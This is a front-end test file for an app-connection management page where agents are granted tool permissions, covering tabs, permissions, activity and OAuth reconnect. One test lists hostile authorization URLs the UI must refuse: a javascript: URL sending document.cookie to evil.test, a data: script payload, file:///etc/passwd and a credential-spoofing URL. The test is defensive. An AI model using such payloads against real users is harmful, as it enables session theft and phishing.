// @vitest-environment jsdom

import { flushSync } from "react-dom";
import type { ReactNode } from "react";
import { createRoot } from "react-dom/client";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { AppDetail } from "./AppDetail";
import { APP_TABS } from "./app-tabs";

const getConnectionMock = vi.hoisted(() => vi.fn());
const getConnectionInstallsMock = vi.hoisted(() => vi.fn());
const listGalleryMock = vi.hoisted(() => vi.fn());
const listCatalogMock = vi.hoisted(() => vi.fn());
const listProfilesMock = vi.hoisted(() => vi.fn());
const listPoliciesMock = vi.hoisted(() => vi.fn());
const listConnectionActivityMock = vi.hoisted(() => vi.fn());
const listActionRequestsMock = vi.hoisted(() => vi.fn());
const updateConnectionMock = vi.hoisted(() => vi.fn());
const finishAppMock = vi.hoisted(() => vi.fn());
const putConnectionInstallsMock = vi.hoisted(() => vi.fn());
const refreshCatalogMock = vi.hoisted(() => vi.fn());
const startOAuthMock = vi.hoisted(() => vi.fn());
const listConnectionGrantsMock = vi.hoisted(() => vi.fn());
const createConnectionGrantDelegationMock = vi.hoisted(() => vi.fn());
const revokeConnectionGrantDelegationMock = vi.hoisted(() => vi.fn());
const listUserDirectoryMock = vi.hoisted(() => vi.fn());
const getSessionMock = vi.hoisted(() => vi.fn());
const mockNavigate = vi.hoisted(() => vi.fn());
const mockParams = vi.hoisted(() => ({ connectionId: "conn-1", tab: "setup" as string | undefined }));
const mockSearchParams = vi.hoisted(() => ({ value: new URLSearchParams() }));
const navigateComponentMock = vi.hoisted(() => vi.fn());
const navigateTopLevelMock = vi.hoisted(() => vi.fn());

vi.mock("@/api/tools", () => ({
  toolsApi: {
    getConnection: (connectionId: string) => getConnectionMock(connectionId),
    getConnectionInstalls: (connectionId: string) => getConnectionInstallsMock(connectionId),
    listGallery: (companyId: string) => listGalleryMock(companyId),
    listCatalog: (connectionId: string) => listCatalogMock(connectionId),
    listProfiles: (companyId: string) => listProfilesMock(companyId),
    listPolicies: (companyId: string) => listPoliciesMock(companyId),
    listConnectionActivity: (connectionId: string, limit: number) =>
      listConnectionActivityMock(connectionId, limit),
    listActionRequests: (companyId: string, status: string) =>
      listActionRequestsMock(companyId, status),
    updateConnection: (connectionId: string, input: unknown) =>
      updateConnectionMock(connectionId, input),
    finishApp: (companyId: string, connectionId: string, input: unknown) =>
      finishAppMock(companyId, connectionId, input),
    putConnectionInstalls: (connectionId: string, installs: unknown) =>
      putConnectionInstallsMock(connectionId, installs),
    archiveConnection: vi.fn(),
    refreshCatalog: (connectionId: string) => refreshCatalogMock(connectionId),
    startOAuth: (connectionId: string) => startOAuthMock(connectionId),
    listConnectionGrants: (connectionId: string) => listConnectionGrantsMock(connectionId),
    createConnectionGrantDelegation: (connectionId: string, grantId: string, agentId: string) =>
      createConnectionGrantDelegationMock(connectionId, grantId, agentId),
    revokeConnectionGrantDelegation: (
      connectionId: string,
      grantId: string,
      delegationId: string,
    ) => revokeConnectionGrantDelegationMock(connectionId, grantId, delegationId),
    reconnectConnection: vi.fn(),
  },
}));

vi.mock("@/api/access", () => ({
  accessApi: {
    listUserDirectory: (companyId: string) => listUserDirectoryMock(companyId),
  },
}));

vi.mock("@/api/auth", () => ({
  authApi: {
    getSession: () => getSessionMock(),
  },
}));

vi.mock("@/api/agents", () => ({
  agentsApi: {
    list: vi.fn().mockResolvedValue([
      { id: "agent-1", name: "Coder", title: "Engineer", status: "active" },
    ]),
  },
}));

vi.mock("@/lib/browserNavigation", () => ({
  navigateTopLevel: (target: string) => navigateTopLevelMock(target),
}));

vi.mock("@/lib/router", () => ({
  useParams: () => mockParams,
  useNavigate: () => mockNavigate,
  useSearchParams: () => [mockSearchParams.value, vi.fn()],
  Navigate: ({ to, replace }: { to: string; replace?: boolean }) => {
    navigateComponentMock({ to, replace });
    return <div data-navigate-to={to} />;
  },
  Link: ({ to, children, ...props }: { to: string; children: ReactNode }) => (
    <a href={to} {...props}>
      {children}
    </a>
  ),
}));

vi.mock("@/context/CompanyContext", () => ({
  useCompany: () => ({
    selectedCompanyId: "company-1",
    selectedCompany: { id: "company-1", name: "Paperclip" },
  }),
}));

vi.mock("@/context/BreadcrumbContext", () => ({
  useBreadcrumbs: () => ({ setBreadcrumbs: vi.fn() }),
}));

const pushToastMock = vi.hoisted(() => vi.fn());
vi.mock("@/context/ToastContext", () => ({
  useToast: () => ({ pushToast: pushToastMock }),
}));

// eslint-disable-next-line @typescript-eslint/no-explicit-any
(globalThis as any).IS_REACT_ACT_ENVIRONMENT = true;

async function act(callback: () => void | Promise<void>) {
  let result: void | Promise<void> = undefined;
  flushSync(() => {
    result = callback();
  });
  await result;
}

async function flushReact() {
  for (let i = 0; i < 3; i += 1) {
    await act(async () => {
      await Promise.resolve();
      await new Promise((resolve) => window.setTimeout(resolve, 0));
    });
  }
}

function connection(overrides: Record<string, unknown> = {}) {
  return {
    id: "conn-1",
    companyId: "company-1",
    applicationId: "app-1",
    name: "GitHub",
    connectionKind: "managed",
    transport: "mcp_remote",
    status: "active",
    transportConfig: { url: "https://github.example/mcp" },
    config: { url: "https://github.example/mcp" },
    credentialSecretRefs: [],
    credentialRefs: [],
    healthStatus: "healthy",
    healthCheckedAt: null,
    lastError: null,
    enabled: true,
    lastUsedAt: null,
    createdByAgentId: null,
    createdByUserId: null,
    createdAt: new Date("2026-01-01T00:00:00Z"),
    updatedAt: new Date("2026-01-01T00:00:00Z"),
    ...overrides,
  };
}

function catalogEntry(overrides: Record<string, unknown> = {}) {
  return {
    id: "catalog-read",
    companyId: "company-1",
    connectionId: "conn-1",
    toolName: "read_repo",
    title: "Read repo",
    description: "Read repository metadata",
    status: "active",
    isReadOnly: true,
    riskLevel: "read",
    createdAt: new Date("2026-01-01T00:00:00Z"),
    updatedAt: new Date("2026-01-01T00:00:00Z"),
    ...overrides,
  };
}

function setInputValue(input: HTMLInputElement, value: string) {
  const setter = Object.getOwnPropertyDescriptor(
    window.HTMLInputElement.prototype,
    "value",
  )?.set;
  setter?.call(input, value);
  input.dispatchEvent(new Event("input", { bubbles: true }));
}

describe("AppDetail", () => {
  let container: HTMLDivElement;
  let root: ReturnType<typeof createRoot>;

  beforeEach(() => {
    container = document.createElement("div");
    document.body.appendChild(container);
    mockParams.connectionId = "conn-1";
    mockParams.tab = "setup";
    mockSearchParams.value = new URLSearchParams();
    getConnectionMock.mockResolvedValue(connection());
    getConnectionInstallsMock.mockResolvedValue({ connectionId: "conn-1", installs: [] });
    listGalleryMock.mockResolvedValue({
      apps: [
        {
          key: "github",
          name: "GitHub",
          logoUrl: "https://example.com/github.png",
          tagline: "GitHub tagline",
          description: "Give agents a governed way to inspect repositories and pull requests.",
          authKind: "api_key",
          transportTemplate: { transport: "mcp_remote", url: "https://github.example/mcp" },
          credentialFields: [],
          recommendedDefaults: {},
          urlPatterns: [],
        },
      ],
    });
    listCatalogMock.mockResolvedValue({
      catalog: [
        catalogEntry(),
        catalogEntry({
          id: "catalog-write",
          toolName: "write_issue",
          title: "Write issue",
          description: "Create or update an issue",
          isReadOnly: false,
        }),
        catalogEntry({
          id: "catalog-quarantined",
          toolName: "delete_repo",
          title: "Delete repo",
          status: "quarantined",
          isReadOnly: false,
        }),
      ],
    });
    listProfilesMock.mockResolvedValue({
      profiles: [
        {
          profileKey: "app:conn-1",
          entries: [
            { effect: "include", catalogEntryId: "catalog-read" },
            { effect: "include", catalogEntryId: "catalog-write" },
          ],
          bindings: [{ targetType: "company" }],
        },
      ],
    });
    listPoliciesMock.mockResolvedValue({
      policies: [
        {
          policyType: "require_approval",
          enabled: true,
          config: {
            source: "app_gallery_finish",
            connectionId: "conn-1",
            catalogEntryId: "catalog-write",
          },
        },
      ],
    });
    listConnectionActivityMock.mockResolvedValue({ events: [], issues: {}, actionRequests: {} });
    listActionRequestsMock.mockResolvedValue({ actionRequests: [] });
    updateConnectionMock.mockResolvedValue(connection({ enabled: false }));
    finishAppMock.mockResolvedValue({});
    putConnectionInstallsMock.mockResolvedValue({ connectionId: "conn-1", installs: [] });
    refreshCatalogMock.mockResolvedValue({ discoveredCount: 0, quarantinedCount: 0, catalog: [] });
    startOAuthMock.mockResolvedValue({
      connectionId: "conn-1",
      provider: "smoke_lab",
      authorizationUrl: "https://example.test/oauth",
      expiresAt: "2026-07-10T00:00:00.000Z",
    });
    listConnectionGrantsMock.mockResolvedValue({
      connection: { id: "conn-1", uid: "conn-1" },
      grants: [],
    });
    createConnectionGrantDelegationMock.mockResolvedValue({
      id: "delegation-1",
      grantId: "grant-user",
      agentId: "agent-1",
    });
    revokeConnectionGrantDelegationMock.mockResolvedValue({});
    listUserDirectoryMock.mockResolvedValue({ users: [] });
    getSessionMock.mockResolvedValue({
      user: { id: "user-1", name: "Dotta", image: null },
      session: { userId: "user-1" },
    });
  });

  afterEach(() => {
    flushSync(() => root?.unmount());
    container.remove();
    vi.clearAllMocks();
  });

  async function renderAppDetail() {
    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
    root = createRoot(container);
    await act(async () => {
      root.render(
        <QueryClientProvider client={client}>
          <AppDetail />
        </QueryClientProvider>,
      );
    });
    await flushReact();
  }

  it("places Test immediately below Setup", () => {
    expect(APP_TABS.map((tab) => tab.key)).toEqual([
      "setup",
      "test",
      "review",
      "permissions",
      "activity",
    ]);
  });

  it("pauses the app by flipping the connection enabled flag", async () => {
    await renderAppDetail();

    const toggle = container.querySelector<HTMLButtonElement>(
      'button[role="switch"][aria-label="Pause this app"]',
    );
    expect(toggle).toBeTruthy();

    await act(async () => {
      toggle!.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(updateConnectionMock).toHaveBeenCalledWith("conn-1", { enabled: false });
  });

  it("keeps the unverified-server marker on URL-only connection details", async () => {
    getConnectionMock.mockResolvedValue(
      connection({
        name: "127.0.0.1",
        config: { url: "http://127.0.0.1:8848/mcp" },
        transportConfig: { url: "http://127.0.0.1:8848/mcp" },
      }),
    );

    await renderAppDetail();

    expect(container.textContent).toContain("Custom app");
    expect(container.textContent).toContain("hosted at 127.0.0.1");
    expect(container.textContent).toContain("Unverified server");
    expect(container.textContent).toContain("127.0.0.1:8848");
  });

  it("redirects a missing tab to setup", async () => {
    mockParams.tab = undefined;

    await renderAppDetail();

    expect(navigateComponentMock).toHaveBeenCalledWith({ to: "/apps/conn-1/setup", replace: true });
  });

  it.each([
    ["setup", "Agents can use this app", false],
    ["review", "Review 1 new action", true],
    ["permissions", "Action permissions", true],
    ["activity", "No activity yet.", false],
  ])("renders the %s tab panel", async (tab, expectedText, showsActionCount) => {
    mockParams.tab = tab;

    await renderAppDetail();

    expect(container.textContent).toContain("GitHub");
    expect(container.textContent?.includes("2 actions available")).toBe(showsActionCount);
    expect(container.textContent).toContain(expectedText);
    expect(container.querySelector("section.bg-card")).toBeNull();
  });

  it("redirects the legacy Advanced route to Setup", async () => {
    mockParams.tab = "advanced";

    await renderAppDetail();

    expect(navigateComponentMock).toHaveBeenCalledWith({
      to: "/apps/conn-1/setup",
      replace: true,
    });
  });

  it("renders setup without waiting for tool discovery", async () => {
    listCatalogMock.mockImplementation(() => new Promise(() => undefined));

    await renderAppDetail();

    expect(container.textContent).toContain("Agents can use this app");
    expect(container.textContent).not.toContain("Loading tools");
    expect(listCatalogMock).not.toHaveBeenCalled();
  });

  it("shows an explicit lazy-loading state while a tool tab discovers actions", async () => {
    mockParams.tab = "permissions";
    listCatalogMock.mockImplementation(() => new Promise(() => undefined));

    await renderAppDetail();

    expect(container.textContent).toContain("GitHub");
    expect(container.textContent).toContain("Loading tools…");
    expect(container.textContent).not.toContain("Action permissions");
  });

  it("explains that MCP actions can take a minute while Test loads", async () => {
    mockParams.tab = "test";
    listCatalogMock.mockImplementation(() => new Promise(() => undefined));

    await renderAppDetail();

    expect(container.textContent).toContain("Loading MCP actions, this may take a minute.");
    expect(container.querySelector(".animate-spin")).toBeTruthy();
  });

  it("confirms a successful connection on Test and clears the one-time URL flag", async () => {
    mockParams.tab = "test";
    mockSearchParams.value = new URLSearchParams("success=1");

    await renderAppDetail();

    expect(pushToastMock).toHaveBeenCalledWith({
      title: "GitHub connected",
      body: "The connection is ready. You can test an action below.",
      tone: "success",
    });
    expect(mockNavigate).toHaveBeenCalledWith("/apps/conn-1/test", { replace: true });
  });

  it("hides secret URL parameters in setup technical details", async () => {
    mockParams.tab = "setup";
    getConnectionMock.mockResolvedValue(
      connection({
        config: {
          url: "https://mcp.zapier.com/api/v1/connect?token=zapier-secret&region=us",
        },
      }),
    );

    await renderAppDetail();

    expect(container.textContent).toContain(
      "https://mcp.zapier.com/api/v1/connect?token=REDACTED&region=us",
    );
    expect(container.textContent).not.toContain("zapier-secret");
  });

  it("reviews quarantined actions as one toggle list and saves allowed and blocked choices together", async () => {
    mockParams.tab = "review";
    listCatalogMock.mockResolvedValue({
      catalog: [
        catalogEntry(),
        catalogEntry({
          id: "catalog-write",
          toolName: "write_issue",
          title: "Write issue",
          isReadOnly: false,
        }),
        catalogEntry({
          id: "catalog-quarantined-allow",
          toolName: "delete_repo",
          title: "Delete repo",
          status: "quarantined",
          isReadOnly: false,
        }),
        catalogEntry({
          id: "catalog-quarantined-block",
          toolName: "archive_repo",
          title: "Archive repo",
          status: "quarantined",
          isReadOnly: false,
        }),
      ],
    });

    await renderAppDetail();

    expect(container.textContent).toContain("Review 2 new actions");
    expect(container.textContent).toContain("Delete repo");
    expect(container.textContent).toContain("Archive repo");
    expect(container.textContent).not.toContain("Nothing is waiting for your OK right now.");

    const allowToggle = container.querySelector<HTMLButtonElement>(
      'button[role="switch"][aria-label="Delete repo allowed"]',
    );
    expect(allowToggle?.getAttribute("aria-checked")).toBe("false");
    await act(async () => {
      allowToggle?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    await act(async () => {
      Array.from(container.querySelectorAll("button"))
        .find((button) => button.textContent?.trim() === "Save choices")
        ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(finishAppMock).toHaveBeenCalledWith("company-1", "conn-1", {
      enabledCatalogEntryIds: expect.arrayContaining([
        "catalog-read",
        "catalog-write",
        "catalog-quarantined-allow",
      ]),
      askFirstCatalogEntryIds: ["catalog-write"],
      reviewedCatalogEntryIds: expect.arrayContaining([
        "catalog-quarantined-allow",
        "catalog-quarantined-block",
      ]),
      access: "all_agents",
    });
    const finishInput = finishAppMock.mock.calls.at(-1)?.[2] as { enabledCatalogEntryIds: string[] };
    expect(finishInput.enabledCatalogEntryIds).not.toContain("catalog-quarantined-block");
  });

  it("keeps setup focused while including technical details and the danger zone", async () => {
    mockParams.tab = "setup";

    await renderAppDetail();

    expect(container.textContent).toContain("Give agents a governed way to inspect repositories and pull requests.");
    expect(container.textContent).toContain("Agents can use this app");
    expect(container.textContent).toContain("Technical details");
    expect(container.textContent).toContain("Danger zone");
    expect(container.textContent).not.toContain("Read repo");
    expect(container.textContent).not.toContain("Action permissions");
    expect(container.querySelector("section.bg-card")).toBeNull();
  });

  it("shows the Smoke OAuth connection action for the installed HTTP fixture", async () => {
    getConnectionMock.mockResolvedValue(connection({
      name: "Smoke Lab HTTP MCP fixture",
      config: {
        smokeLabFixture: "oauth-http",
        oauth: {
          provider: "smoke_lab",
          smokeLabFixture: true,
          scopes: ["smoke:openid"],
        },
      },
    }));

    await renderAppDetail();

    expect(container.textContent).toContain("Connect with Smoke OAuth");
    expect(
      Array.from(container.querySelectorAll("button")).some(
        (button) => button.textContent?.trim() === "Connect with Smoke OAuth",
      ),
    ).toBe(true);
  });

  it("matches connected Notion guidance to the reconnect action", async () => {
    getConnectionMock.mockResolvedValue(connection({
      name: "Notion",
      createdByUserId: "user-1",
      config: {
        sourceTemplateKey: "notion",
        oauth: {
          provider: "notion",
          connectedAt: "2026-08-06T20:00:00.000Z",
        },
      },
    }));
    listGalleryMock.mockResolvedValue({
      apps: [{
        key: "notion",
        name: "Notion",
        logoUrl: "https://example.com/notion.png",
        tagline: "Search and update your Notion workspace.",
        description: "Give agents governed access to Notion.",
        authKind: "oauth",
        transportTemplate: { transport: "mcp_remote", url: "https://mcp.notion.com/mcp" },
        credentialFields: [],
        recommendedDefaults: {},
        urlPatterns: [],
      }],
    });
    listUserDirectoryMock.mockResolvedValue({
      users: [{
        principalId: "user-1",
        status: "active",
        user: {
          id: "user-1",
          name: "Dotta",
          email: "dotta@example.com",
          image: "https://example.com/dotta.png",
        },
      }],
    });

    await renderAppDetail();

    expect(container.textContent).toContain("Dotta’s Notion");
    expect(container.textContent).toContain("Connected by");
    expect(container.querySelector('[title="Dotta"] [data-slot="avatar"]')).toBeTruthy();
    expect(container.textContent).toContain(
      "Your workspace authorization is active. Reconnect any time to replace it.",
    );
    expect(container.textContent).not.toContain("Sign in again any time");
  });

  it("lets Google Sheets connections add spreadsheet links from setup", async () => {
    mockParams.tab = "setup";
    getConnectionMock.mockResolvedValue(connection({
      name: "Google Sheets",
      transport: "local_stdio",
      config: {
        templateId: "paperclip.google-sheets",
        sourceTemplateKey: "google-sheets",
        allowedSpreadsheetIds: ["sheet_existing"],
        env: { GOOGLE_SHEETS_ALLOWED_SPREADSHEET_IDS: "sheet_existing" },
      },
    }));
    listGalleryMock.mockResolvedValue({
      apps: [
        {
          key: "google-sheets",
          name: "Google Sheets",
          logoUrl: "https://example.com/sheets.png",
          tagline: "Read and update selected spreadsheets.",
          description: "Share each sheet with the robot email, then paste the sheet links here.",
          authKind: "none",
          transportTemplate: { transport: "local_stdio", templateKey: "paperclip.google-sheets" },
          credentialFields: [],
          recommendedDefaults: {},
          urlPatterns: ["https://docs.google.com/spreadsheets/*"],
          availability: { available: true, robotEmail: "robot@paperclip.iam.gserviceaccount.com" },
        },
      ],
    });

    await renderAppDetail();

    expect(container.textContent).toContain("Sheets agents can use");
    expect(container.textContent).toContain("https://docs.google.com/spreadsheets/d/sheet_existing/edit");
    expect(container.textContent).toContain("sheet_existing");
    const input = container.querySelector<HTMLInputElement>(
      'input[placeholder="https://docs.google.com/spreadsheets/d/..."]',
    );
    expect(input).toBeTruthy();
    await act(async () => setInputValue(input!, "https://docs.google.com/spreadsheets/d/sheet_new/edit"));
    await flushReact();
    await act(async () => {
      Array.from(container.querySelectorAll("button"))
        .find((button) => button.textContent?.trim() === "Add sheet")
        ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(updateConnectionMock).toHaveBeenCalledWith("conn-1", {
      config: expect.objectContaining({
        allowedSpreadsheetIds: ["sheet_existing", "sheet_new"],
        env: expect.objectContaining({ GOOGLE_SHEETS_ALLOWED_SPREADSHEET_IDS: "sheet_existing,sheet_new" }),
      }),
      transportConfig: { url: "https://github.example/mcp" },
    });
  });

  it("renders unified action permission dropdowns in the permissions tab", async () => {
    mockParams.tab = "permissions";

    await renderAppDetail();

    expect(container.textContent).toContain("Read only");
    expect(container.textContent).toContain("Can make changes");
    expect(container.textContent).toContain("Read repo");
    expect(container.textContent).toContain("Write issue");
    expect(container.textContent).toContain("Review 1 new action");
    const readSelect = container.querySelector<HTMLSelectElement>('select[aria-label="Read repo permission"]');
    const writeSelect = container.querySelector<HTMLSelectElement>('select[aria-label="Write issue permission"]');
    expect(readSelect?.value).toBe("allowed");
    expect(writeSelect?.value).toBe("ask");
    expect(container.querySelector("section.bg-card")).toBeNull();
  });

  it("persists ask-first for read-only actions from the unified dropdown", async () => {
    mockParams.tab = "permissions";

    await renderAppDetail();

    const readSelect = container.querySelector<HTMLSelectElement>('select[aria-label="Read repo permission"]');
    expect(readSelect).toBeTruthy();
    await act(async () => {
      readSelect!.value = "ask";
      readSelect!.dispatchEvent(new Event("change", { bubbles: true }));
    });
    await flushReact();

    expect(finishAppMock).toHaveBeenCalledWith("company-1", "conn-1", {
      enabledCatalogEntryIds: expect.arrayContaining(["catalog-read", "catalog-write"]),
      askFirstCatalogEntryIds: expect.arrayContaining(["catalog-read", "catalog-write"]),
      access: "all_agents",
    });
  });

  it("persists off by removing an action from enabled and ask-first sets", async () => {
    mockParams.tab = "permissions";

    await renderAppDetail();

    const writeSelect = container.querySelector<HTMLSelectElement>('select[aria-label="Write issue permission"]');
    expect(writeSelect).toBeTruthy();
    await act(async () => {
      writeSelect!.value = "off";
      writeSelect!.dispatchEvent(new Event("change", { bubbles: true }));
    });
    await flushReact();

    expect(finishAppMock).toHaveBeenCalledWith("company-1", "conn-1", {
      enabledCatalogEntryIds: ["catalog-read"],
      askFirstCatalogEntryIds: [],
      access: "all_agents",
    });
  });

  it("persists installed agents from the permissions tab", async () => {
    mockParams.tab = "permissions";

    await renderAppDetail();

    expect(container.textContent).toContain("Installed on agents");
    await act(async () => {
      Array.from(container.querySelectorAll("button"))
        .find((button) => button.textContent?.includes("Choose agents to install on"))
        ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    const coderCheckbox = document.body.querySelector<HTMLElement>('[aria-label="Allow Coder"]');
    expect(coderCheckbox).toBeTruthy();
    await act(async () => {
      coderCheckbox!.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(putConnectionInstallsMock).toHaveBeenCalledWith("conn-1", [
      { targetType: "agent", targetId: "agent-1" },
    ]);
  });

  it("removes an existing agent grant directly from Permissions", async () => {
    mockParams.tab = "permissions";
    listProfilesMock.mockResolvedValue({
      profiles: [{
        profileKey: "app:conn-1",
        entries: [
          { effect: "include", catalogEntryId: "catalog-read" },
          { effect: "include", catalogEntryId: "catalog-write" },
        ],
        bindings: [{ targetType: "agent", targetId: "agent-1" }],
      }],
    });

    await renderAppDetail();

    const remove = container.querySelector<HTMLButtonElement>('button[aria-label="Remove Coder access"]');
    expect(remove).toBeTruthy();
    await act(async () => {
      remove!.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(finishAppMock).toHaveBeenCalledWith("company-1", "conn-1", {
      enabledCatalogEntryIds: ["catalog-read", "catalog-write"],
      askFirstCatalogEntryIds: ["catalog-write"],
      access: { agentIds: [] },
    });
  });

  it("renders activity attribution with issue context and human resolver names", async () => {
    mockParams.tab = "activity";
    listConnectionActivityMock.mockResolvedValue({
      events: [
        {
          id: "evt-1",
          eventType: "call_completed",
          agentId: "agent-1",
          issueId: "issue-1",
          actionRequestId: null,
          toolName: "Get value",
          outcome: "success",
          createdAt: new Date("2026-06-12T10:00:00Z"),
        },
        {
          id: "evt-2",
          eventType: "approval_resolved",
          agentId: "agent-1",
          issueId: "issue-1",
          actionRequestId: "request-1",
          toolName: "Mark done",
          outcome: "success",
          createdAt: new Date("2026-06-12T10:01:00Z"),
        },
      ],
      issues: {
        "issue-1": { identifier: "PAP-10912", title: "Fix app connection copy" },
      },
      actionRequests: {
        "request-1": {
          status: "approved",
          resolverDisplayName: "Dotta",
          resolvedByAgentId: null,
          resolvedByUserId: "board-user",
        },
      },
    });

    await renderAppDetail();

    expect(container.textContent).toContain("Coder used Get value");
    expect(container.textContent).toContain("while working on PAP-10912");
    expect(container.textContent).toContain("Dotta approved Mark done");
    expect(container.querySelector('a[href="/issues/PAP-10912"]')).toBeTruthy();
    expect(container.textContent).not.toContain("You reviewed");
  });

  it("humanizes the raw gateway-prefixed tool name in activity", async () => {
    mockParams.tab = "activity";
    listConnectionActivityMock.mockResolvedValue({
      events: [
        {
          id: "evt-1",
          eventType: "call_completed",
          agentId: "agent-1",
          issueId: null,
          actionRequestId: null,
          toolName: "mcp.app-gallery-link-ccad39e8-6798a369:kv-set",
          outcome: "success",
          createdAt: new Date("2026-06-12T10:00:00Z"),
        },
      ],
      issues: {},
      actionRequests: {},
    });

    await renderAppDetail();

    expect(container.textContent).toContain("Coder used Kv Set");
    expect(container.textContent).not.toContain("mcp.app-gallery-link");
  });

  it("renders connection lifecycle events humanized on the timeline", async () => {
    mockParams.tab = "activity";
    listConnectionActivityMock.mockResolvedValue({
      events: [
        {
          id: "evt-1",
          eventType: "call_completed",
          agentId: "agent-1",
          issueId: null,
          actionRequestId: null,
          toolName: "Get value",
          outcome: "success",
          createdAt: new Date("2026-06-12T10:30:00Z"),
        },
      ],
      lifecycleEvents: [
        {
          id: "life-connected",
          connectionId: "conn-1",
          type: "app_connected",
          actorType: "user",
          actorId: "board-user",
          agentId: null,
          actorDisplayName: "Dotta",
          details: null,
          createdAt: new Date("2026-06-12T09:00:00Z"),
        },
        {
          id: "life-paused",
          connectionId: "conn-1",
          type: "app_paused",
          actorType: "user",
          actorId: "board-user",
          agentId: null,
          actorDisplayName: "Dotta",
          details: { enabled: false },
          createdAt: new Date("2026-06-12T11:00:00Z"),
        },
        {
          id: "life-allowlist",
          connectionId: "conn-1",
          type: "allowlist_changed",
          actorType: "user",
          actorId: "board-user",
          agentId: null,
          actorDisplayName: "Dotta",
          details: { added: 1, removed: 0, total: 2 },
          createdAt: new Date("2026-06-12T10:45:00Z"),
        },
        {
          id: "life-quarantine",
          connectionId: "conn-1",
          type: "actions_quarantined",
          actorType: "system",
          actorId: null,
          agentId: null,
          actorDisplayName: null,
          details: { count: 2 },
          createdAt: new Date("2026-06-12T10:50:00Z"),
        },
      ],
      issues: {},
      actionRequests: {},
    });

    await renderAppDetail();

    expect(container.textContent).toContain("Dotta connected GitHub");
    expect(container.textContent).toContain("Dotta paused this app");
    expect(container.textContent).toContain("Dotta added 1 sheet to the allowlist");
    expect(container.textContent).toContain("2 new actions need review");
    // Lifecycle rows deep-link to the Setup tab; quarantine uses the review label.
    expect(container.querySelector('a[href="/apps/conn-1/setup"]')).toBeTruthy();
    expect(container.textContent).toContain("Review in Setup");

    // Merged timeline: the newest event (the pause at 11:00) renders before the
    // tool call at 10:30, which renders before the connect at 09:00.
    const pausedAt = container.textContent?.indexOf("Dotta paused this app") ?? -1;
    const usedAt = container.textContent?.indexOf("Coder used Get value") ?? -1;
    const connectedAt = container.textContent?.indexOf("Dotta connected GitHub") ?? -1;
    expect(pausedAt).toBeGreaterThanOrEqual(0);
    expect(pausedAt).toBeLessThan(usedAt);
    expect(usedAt).toBeLessThan(connectedAt);
  });

  it("keeps the header and reconnect banner across tabs", async () => {
    mockParams.tab = "permissions";
    getConnectionMock.mockResolvedValue(connection({
      healthStatus: "degraded",
      healthMessage: "Token expired.",
    }));

    await renderAppDetail();

    expect(container.textContent).toContain("GitHub");
    expect(container.textContent).toContain("Needs attention");
    expect(container.textContent).toContain("This app needs reconnecting");
    expect(container.textContent).toContain("Token expired.");
    expect(container.textContent).toContain("Who can use it");
  });

  it("shows terminal OAuth failures as reconnect-required sign-in", async () => {
    mockParams.tab = "permissions";
    getConnectionMock.mockResolvedValue(connection({
      authKind: "oauth",
      healthStatus: "failed",
      healthMessage: "Authorization expired (invalid_grant).",
    }));

    await renderAppDetail();

    expect(container.textContent).toContain("Reconnect required");
    expect(container.textContent).toContain("Authorization expired (invalid_grant).");
    expect(container.querySelector('input[placeholder="Paste your new key"]')).toBeNull();

    await act(async () => {
      Array.from(container.querySelectorAll("button"))
        .find((button) => button.textContent?.trim() === "Reconnect")
        ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(startOAuthMock).toHaveBeenCalledWith("conn-1");
    expect(navigateTopLevelMock).toHaveBeenCalledWith("https://example.test/oauth");
  });

  /**
   * PAP-17099 — the server refuses to hand out an unsafe authorization endpoint,
   * but this is the boundary where one would actually execute, so the board must
   * refuse it independently of what the response body says.
   */
  it.each([
    ["javascript:", "javascript:fetch('https://evil.test/'+document.cookie)"],
    ["data:", "data:text/html,<script>alert(document.domain)</script>"],
    ["file:", "file:///etc/passwd"],
    ["plaintext http", "http://evil.test/authorize"],
    ["credentials", "https://accounts.example.test@evil.test/authorize"],
  ])("never navigates to a %s authorization url", async (_label, authorizationUrl) => {
    mockParams.tab = "permissions";
    getConnectionMock.mockResolvedValue(connection({
      authKind: "oauth",
      healthStatus: "failed",
      healthMessage: "Authorization expired (invalid_grant).",
    }));
    startOAuthMock.mockResolvedValue({
      connectionId: "conn-1",
      provider: "generic",
      authorizationUrl,
      expiresAt: "2026-07-10T00:00:00.000Z",
    });

    await renderAppDetail();
    await act(async () => {
      Array.from(container.querySelectorAll("button"))
        .find((button) => button.textContent?.trim() === "Reconnect")
        ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(navigateTopLevelMock).not.toHaveBeenCalled();
    expect(pushToastMock).toHaveBeenCalledWith(expect.objectContaining({ tone: "error" }));
    // The refusal explains itself without echoing the hostile URL back into the DOM.
    const body = String(pushToastMock.mock.calls.at(-1)?.[0]?.body ?? "");
    expect(body.length).toBeGreaterThan(0);
    expect(body).not.toContain(authorizationUrl);
  });

  it("lets the personal grant owner delegate autonomous access to a named agent", async () => {
    getConnectionMock.mockResolvedValue(connection({ credentialPolicy: "per_user" }));
    listConnectionGrantsMock.mockResolvedValue({
      connection: { id: "conn-1", uid: "conn-1" },
      grants: [{
        id: "grant-user",
        companyId: "company-1",
        connectionId: "conn-1",
        kind: "user",
        subjectUserId: "user-1",
        providerTenant: null,
        credentialSecretRefs: [],
        status: "active",
        isDefault: false,
        createdByAgentId: null,
        createdByUserId: "user-1",
        revokedAt: null,
        revokedByAgentId: null,
        revokedByUserId: null,
        lastUsedAt: null,
        createdAt: new Date("2026-01-01T00:00:00Z"),
        updatedAt: new Date("2026-01-01T00:00:00Z"),
        delegations: [],
      }],
    });

    await renderAppDetail();

    const trigger = Array.from(container.querySelectorAll("button"))
      .find((button) => button.textContent?.trim() === "Allow autonomous access");
    expect(trigger).toBeTruthy();

    await act(async () => {
      trigger?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

